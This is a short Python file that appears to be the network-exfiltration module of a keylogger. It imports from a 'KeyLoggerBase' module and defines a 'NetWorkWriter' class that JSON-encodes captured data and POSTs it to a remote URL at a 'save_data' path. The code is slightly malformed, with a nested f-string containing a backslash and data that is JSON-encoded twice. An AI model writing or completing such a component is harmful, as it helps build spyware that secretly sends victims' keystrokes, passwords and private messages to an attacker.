from KeyLoggerBase import IFileWriter
import requests
import json


class NetWorkWriter(IFileWriter):
    def send_data(self,url:str,data:str,) ->None:
        data = json.dumps(data)
        requests.post(f"{url}{"\save_data"}",json=data)


